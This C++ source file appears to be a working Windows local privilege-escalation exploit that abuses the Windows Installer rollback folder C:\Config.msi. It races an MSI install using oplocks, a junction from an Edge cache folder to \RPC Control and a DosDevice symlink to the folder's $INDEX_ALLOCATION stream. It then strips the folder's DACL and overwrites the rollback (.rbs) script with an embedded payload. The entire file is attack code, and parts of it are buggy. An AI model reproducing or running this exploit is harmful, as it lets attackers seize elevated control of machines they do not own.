#include <Windows.h>
#include <Shlwapi.h>
#include <Msi.h>
#include <PathCch.h>
#include <AclAPI.h>
#include <iostream>
#include "resource.h"
#include "def.h"
#include "FileOplock.h"
#pragma comment(lib, "Msi.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "PathCch.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma warning(disable:4996)

FileOpLock* oplock;
FileOpLock* oplock1;
HANDLE hFile, hFile2;
HANDLE hthread;
NTSTATUS retcode;
HMODULE hm = GetModuleHandle(NULL);
HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_RBS1), L"rbs");
DWORD RbsSize = SizeofResource(hm, res);
void* RbsBuff = LoadResource(hm, res);
WCHAR dir[MAX_PATH] = { 0x0 };

DWORD WINAPI install(void*);
BOOL Move(HANDLE hFile);
void callback();
HANDLE getDirectoryHandle(LPWSTR file, DWORD access, DWORD share, DWORD dispostion);
LPWSTR  BuildPath(LPCWSTR path);
void loadapis();
VOID cbToJunction();
BOOL Watch(HANDLE hDir);

HANDLE h;

BOOL CreateJunction(LPCWSTR dir, LPCWSTR target) {
	HANDLE hJunction;
	DWORD cb;
	wchar_t printname[] = L"";
	HANDLE hDir;
	hDir = CreateFile(dir, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);

	if (hDir == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to obtain handle on directory %ls.\n", dir);
		return FALSE;
	}

	SIZE_T TargetLen = wcslen(target) * sizeof(WCHAR);
	SIZE_T PrintnameLen = wcslen(printname) * sizeof(WCHAR);
	SIZE_T PathLen = TargetLen + PrintnameLen + 12;
	SIZE_T Totalsize = PathLen + (DWORD)(FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer));
	PREPARSE_DATA_BUFFER Data = (PREPARSE_DATA_BUFFER)malloc(Totalsize);
	Data->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
	Data->ReparseDataLength = PathLen;
	Data->Reserved = 0;
	Data->MountPointReparseBuffer.SubstituteNameOffset = 0;
	Data->MountPointReparseBuffer.SubstituteNameLength = TargetLen;
	memcpy(Data->MountPointReparseBuffer.PathBuffer, target, TargetLen + 2);
	Data->MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2);
	Data->MountPointReparseBuffer.PrintNameLength = (USHORT)PrintnameLen;
	memcpy(Data->MountPointReparseBuffer.PathBuffer + wcslen(target) + 1, printname, PrintnameLen + 2);

	if (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, &cb, NULL) != 0)
	{
		printf("[+] Junction %ls -> %ls created!\n", dir, target);
		free(Data);
		return TRUE;

	}
	else {
		printf("[-] Error: %d. Exiting\n", GetLastError());
		free(Data);
		return FALSE;
	}
}

BOOL DeleteJunction(LPCWSTR path) {
	REPARSE_GUID_DATA_BUFFER buffer = { 0 };
	BOOL ret;
	buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
	DWORD cb = 0;
	IO_STATUS_BLOCK io;


	HANDLE hDir;
	hDir = CreateFile(path, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_OPEN_REPARSE_POINT, NULL);

	if (hDir == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to obtain handle on directory %ls.\n", path);
		printf("%d\n", GetLastError());
		return FALSE;
	}
	ret = DeviceIoControl(hDir, FSCTL_DELETE_REPARSE_POINT, &buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, NULL, NULL, &cb, NULL);
	if (ret == 0) {
		printf("Error: %d\n", GetLastError());
		return FALSE;
	}
	else {
		printf("[+] Junction %ls delete!\n", dir);
		return TRUE;
	}
}

BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target) {

	if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) {
		printf("[+] Symlink %ls -> %ls created!\n", object, target);
		return TRUE;

	}
	else {

		printf("error :%d\n", GetLastError());
		return FALSE;

	}
}

BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target) {

	if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, object, target)) {
		printf("[+] Symlink %ls -> %ls deleted!\n", object, target);
		return TRUE;

	}
	else {
		printf("error :%d\n", GetLastError());
		return FALSE;


	}
}

int wmain() {

	loadapis();

	hFile = getDirectoryHandle(BuildPath(L"C:\\Config.msi"), GENERIC_READ | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to create C:\\Config.msi directory. Trying to delete it.\n");
		install(NULL);
		hFile = getDirectoryHandle(BuildPath(L"C:\\Config.msi"), GENERIC_READ | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			printf("[+] Successfully removed and recreated C:\\Config.Msi.\n");
		}
		else {
			printf("[-] Failed. Cannot remove c:\\Config.msi");
			return 1;
		}
	}
	if (!PathIsDirectoryEmpty(L"C:\\Config.Msi"))
	{
		printf("[-] Failed.  C:\\Config.Msi already exists and is not empty.\n");
		return 1;
	}

	printf("[+] Config.msi directory created!\n");

	HANDLE hDir = getDirectoryHandle(BuildPath(L"C:\\Users\\asdf\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Code Cache\\js"), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF);
	//printf("hDir: %x\n", hDir); // just to see handle is not 0
	Watch(hDir);

	SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
	SetThreadPriorityBoost(GetCurrentThread(), TRUE);      // This lets us maintain express control of our priority
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
	oplock = FileOpLock::CreateLock(hFile, callback);
	if (oplock != nullptr) {

		oplock->WaitForLock(INFINITE);
		delete oplock;
	}
	do {
		hFile = getDirectoryHandle(BuildPath(L"C:\\Config.msi"), GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN_IF);
	} while (!hFile);
	char buff[4096];
	DWORD retbt = 0;
	FILE_NOTIFY_INFORMATION* fn;
	WCHAR* extension;
	WCHAR* extension2;
	do {
		ReadDirectoryChangesW(hFile, buff, sizeof(buff) - sizeof(WCHAR), TRUE, FILE_NOTIFY_CHANGE_FILE_NAME,
			&retbt, NULL, NULL);
		fn = (FILE_NOTIFY_INFORMATION*)buff;
		size_t sz = fn->FileNameLength / sizeof(WCHAR);
		fn->FileName[sz] = '\0';
		extension = fn->FileName;
		PathCchFindExtension(extension, MAX_PATH, &extension2);
	} while (wcscmp(extension2, L".rbs") != 0);

	SetSecurityInfo(hFile, SE_FILE_OBJECT, UNPROTECTED_DACL_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, NULL, NULL, NULL, NULL);
	while (!Move(hFile)) {

	}
	HANDLE cfg_h = getDirectoryHandle(BuildPath(L"C:\\Config.msi"), FILE_READ_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_CREATE);
	WCHAR rbsfile[MAX_PATH];
	_swprintf(rbsfile, L"C:\\Config.msi\\%s", fn->FileName);
	HANDLE rbs = CreateFile(rbsfile, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (WriteFile(rbs, RbsBuff, RbsSize, NULL, NULL)) {
		printf("[+] Rollback script overwritten!\n");

	}
	else {
		printf("[-] Failed to overwrite rbs file!\n");
	}
	CloseHandle(rbs);
	CloseHandle(cfg_h);
	DeleteJunction(dir);
	DelDosDeviceSymLink(L"GLOBAL\\GLOBALROOT\\RPC Control\\hi.txt", L"\\??\\C:\\Config.msi::$INDEX_ALLOCATION");
	return 0;

}


DWORD WINAPI install(void*) {
	HMODULE hm = GetModuleHandle(NULL);
	HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_MSI1), L"msi");
	wchar_t msipackage[MAX_PATH] = { 0x0 };
	GetTempFileName(L"C:\\windows\\temp\\", L"MSI", 0, msipackage);
	printf("[*] MSI file: %ls\n", msipackage);
	DWORD MsiSize = SizeofResource(hm, res);
	void* MsiBuff = LoadResource(hm, res);
	HANDLE pkg = CreateFile(msipackage, GENERIC_WRITE | WRITE_DAC, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(pkg, MsiBuff, MsiSize, NULL, NULL);
	CloseHandle(pkg);
	MsiSetInternalUI(INSTALLUILEVEL_NONE, NULL);
	UINT a = MsiInstallProduct(msipackage, L"ACTION=INSTALL");
	if (1 == 1603) {
		printf("[-] seems like race failed\n");
	}
	MsiInstallProduct(msipackage, L"REMOVE=ALL");
	DeleteFile(msipackage);
	return 0;
}
BOOL Move(HANDLE hFile) {
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[-] Invalid handle!\n");
		return FALSE;
	}
	wchar_t tmpfile[MAX_PATH] = { 0x0 };
	RPC_WSTR str_uuid;
	UUID uuid = { 0 };
	UuidCreate(&uuid);
	UuidToString(&uuid, &str_uuid);
	_swprintf(tmpfile, L"\\??\\C:\\windows\\temp\\%s", str_uuid);
	size_t buffer_sz = sizeof(FILE_RENAME_INFO) + (wcslen(tmpfile) * sizeof(wchar_t));
	FILE_RENAME_INFO* rename_info = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, buffer_sz);
	IO_STATUS_BLOCK io = { 0 };
	rename_info->ReplaceIfExists = TRUE;
	rename_info->RootDirectory = NULL;
	rename_info->Flags = 0x00000001 | 0x00000002 | 0x00000040;
	rename_info->FileNameLength = wcslen(tmpfile) * sizeof(wchar_t);
	memcpy(&rename_info->FileName[0], tmpfile, wcslen(tmpfile) * sizeof(wchar_t));
	NTSTATUS status = pNtSetInformationFile(hFile, &io, rename_info, buffer_sz, 65);
	if (status != 0) {
		return FALSE;
	}
	return TRUE;
}

void callback() {

	SetThreadPriority(GetCurrentThread(), REALTIME_PRIORITY_CLASS);
	Move(hFile);
	hthread = CreateThread(NULL, NULL, install, NULL, NULL, NULL);
	HANDLE hd;
	do {
		hd = getDirectoryHandle(BuildPath(L"C:\\Config.msi"), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN);
	} while (!hd);
	do {
		CloseHandle(hd);
		hd = getDirectoryHandle(BuildPath(L"C:\\Config.msi"), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN);
	} while (hd);
	CloseHandle(hd);
	do {
		hd = getDirectoryHandle(BuildPath(L"C:\\Config.msi"), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN);

		CloseHandle(hd);
	} while (retcode != 0xC0000022);
	

}
HANDLE getDirectoryHandle(LPWSTR file, DWORD access, DWORD share, DWORD dispostion) {
	OBJECT_ATTRIBUTES attrib{};
	IO_STATUS_BLOCK iosb{};
	UNICODE_STRING ufile;
	HANDLE hDir;
	pRtlInitUnicodeString(&ufile, file);

	InitializeObjectAttributes(&attrib, &ufile, OBJ_CASE_INSENSITIVE, NULL, NULL);

	retcode = pNtCreateFile(&hDir, access, &attrib, &iosb, NULL, FILE_ATTRIBUTE_NORMAL, share, dispostion, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);

	if (!NT_SUCCESS(retcode)) {
		return NULL;
	}
	return hDir;
}

LPWSTR BuildPath(LPCWSTR path) {
	wchar_t ntpath[MAX_PATH];
	swprintf(ntpath, L"\\??\\%s", path);
	return ntpath;
}

void loadapis() {

	HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
	if (ntdll != NULL) {
		pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
		pNtCreateFile = (_NtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
		pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, "NtSetInformationFile");

	}
	if (pRtlInitUnicodeString == NULL || pNtCreateFile == NULL) {
		printf("Cannot load api's %d\n", GetLastError());
		exit(0);
	}

}

void cbToJunction() {
	
	printf("[+] file callback triggered\n");
	if (!Move(h)) {
		printf("[-] error moving file\n");
		exit(1);
	}
	printf("[+] file moved!\n");
	
	_swprintf(dir, L"C:\\Users\\asdf\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Code Cache\\js");
	if (!CreateJunction(BuildPath(dir), L"\\RPC Control")) {
		printf("[-] Exiting!\n");
		exit(1);
	}
	if (!DosDeviceSymLink(L"GLOBAL\\GLOBALROOT\\RPC Control\\hi.txt", L"\\??\\C:\\Config.msi::$INDEX_ALLOCATION")) {
		printf("[-] pseudo symlink error\n");
	}
}

BOOL Watch(HANDLE hDir) {

	printf("Monitor called\n");
	PFILE_NOTIFY_INFORMATION fi{};
	BOOL deleted = FALSE;
	wchar_t file[MAX_PATH] = { 0x0 };
	do {
		h = CreateFile(L"C:\\Users\\asdf\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Code Cache\\js\\hi.txt", DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);
		printf("h: %x\n", h);
	} while (h == INVALID_HANDLE_VALUE);
	oplock = FileOpLock::CreateLock(h, cbToJunction);
	if (oplock != NULL) {
		deleted = TRUE;
		oplock->WaitForLock(INFINITE);
	}
	return deleted;
}